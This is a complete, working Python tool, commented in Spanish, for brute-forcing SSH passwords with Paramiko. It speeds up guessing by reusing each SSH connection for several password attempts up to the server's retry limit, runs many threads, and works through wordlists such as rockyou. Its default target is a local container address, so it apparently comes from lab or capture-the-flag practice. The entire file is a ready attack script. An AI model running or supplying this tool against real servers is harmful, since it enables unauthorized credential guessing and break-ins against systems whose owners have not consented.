#!/usr/bin/env python3
"""
Fuerza bruta SSH rapida sobre Paramiko.

Ventaja frente a hydra/ncrack: reutiliza el MISMO transporte SSH para probar
varios contrasenas seguidas. El servidor permite reintentar la autenticacion
por password sobre una conexion ya establecida, asi que se evita el handshake
completo en cada intento.

Uso:
    python3 ssh_brute.py -H 172.17.0.2 -u tails -P wordlists/passwords.txt
    python3 ssh_brute.py -H 172.17.0.2 -U wordlists/users.txt -P wordlists/passwords.txt
"""
import argparse
import itertools
import queue
import socket
import sys
import threading
import time

import paramiko

# paramiko imprime tracebacks desde su hilo interno cuando el servidor corta
# la conexion (MaxStartups). No es un fallo del brute forcer, solo ruido.
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
paramiko.util.log_to_file("/dev/null", level=logging.CRITICAL)

STOP = threading.Event()
LOCK = threading.Lock()
STATE = {"attempts": 0, "found": None, "user": None, "pass": None, "pos": 0}


MAX_TRIES_PER_CONN = 6   # MaxAuthTries por defecto de OpenSSH: al superarlo
                         # el servidor CIERRA la conexion, hay que reconectar


def worker(host, port, user, passwords, _):
    """Prueba contrasenas abriendo conexiones y reutilizando cada transporte
    hasta que el servidor la cierra (MaxAuthTries)."""
    i = 0
    total = len(passwords)
    while i < total and not STOP.is_set():
        try:
            sock = socket.create_connection((host, port), timeout=15)
        except OSError:
            time.sleep(0.2)
            continue
        transport = paramiko.Transport(sock)
        try:
            transport.start_client(timeout=20)
        except Exception:
            try:
                transport.close()
            except Exception:
                pass
            continue

        for _ in range(MAX_TRIES_PER_CONN):
            if i >= total or STOP.is_set():
                break
            pw = passwords[i]
            i += 1
            with LOCK:
                STATE["pos"] += 1
            try:
                transport.auth_password(user, pw)
                with LOCK:
                    STATE["attempts"] += 1
                    STATE["found"] = True
                    STATE["user"] = user
                    STATE["pass"] = pw
                STOP.set()
            except paramiko.AuthenticationException:
                with LOCK:
                    STATE["attempts"] += 1
                continue
            except Exception:
                # el servidor corto la conexion (MaxAuthTries superado):
                # se rompe el bucle interno y se reconecta
                break

        try:
            transport.close()
        except Exception:
            pass


def main():
    ap = argparse.ArgumentParser(description="Fuerza bruta SSH (Paramiko, transporte reutilizado)")
    ap.add_argument("-H", "--host", default="172.17.0.2")
    ap.add_argument("-p", "--port", type=int, default=22)
    ap.add_argument("-u", "--user", help="usuario unico")
    ap.add_argument("-U", "--userfile", help="fichero de usuarios")
    ap.add_argument("-P", "--passfile", required=True, help="fichero de contrasenas")
    ap.add_argument("-t", "--threads", type=int, default=8)
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    # errors="ignore": rockyou incluye bytes no UTF-8 en sus ultimas lineas;
    # sin esto el forzador muere antes de llegar a la cola de la lista.
    users = [args.user] if args.user else [
        u.strip() for u in open(args.userfile, encoding="utf-8", errors="ignore") if u.strip()
    ]
    passwords = [p.strip() for p in open(args.passfile, encoding="utf-8", errors="ignore") if p.strip()]

    if not args.quiet:
        print(f"[*] Objetivo {args.host}:{args.port}")
        print(f"[*] {len(users)} usuario(s) x {len(passwords)} contrasena(s) "
              f"= {len(users) * len(passwords)} combinaciones")
        print(f"[*] {args.threads} hilos, transporte SSH reutilizado", file=sys.stderr)

    # Reparte las contrasenas entre los hilos, round-robin, para no repetir
    # trabajo y avanzar en paralelo por la lista.
    start = time.time()
    threads = []
    for user in users:
        chunks = [passwords[i::args.threads] for i in range(args.threads)]
        for chunk in chunks:
            if not chunk:
                continue
            t = threading.Thread(target=worker,
                                 args=(args.host, args.port, user, chunk, None),
                                 daemon=True)
            t.start()
            threads.append(t)

    last_report = start
    while any(t.is_alive() for t in threads):
        time.sleep(0.5)
        if not args.quiet and time.time() - last_report > 2:
            done = STATE["attempts"]
            rate = done / max(time.time() - start, 0.001)
            print(f"\r[*] {done} intentos  ({rate:.0f}/s)  pos={STATE['pos']}/{len(users) * len(passwords)}", end="", file=sys.stderr)
            last_report = time.time()

    elapsed = time.time() - start
    if not args.quiet:
        print(file=sys.stderr)
    if STATE["found"]:
        print(f"\n[+] CREDENCIAL ENCONTRADA: {STATE['user']} / {STATE['pass']}")
        print(f"[*] {STATE['attempts']} intentos en {elapsed:.1f}s "
              f"({STATE['attempts'] / max(elapsed, 0.001):.0f}/s)")
        return 0
    print(f"\n[-] Sin exito: {STATE['attempts']} intentos en {elapsed:.1f}s")
    return 1


if __name__ == "__main__":
    sys.exit(main())
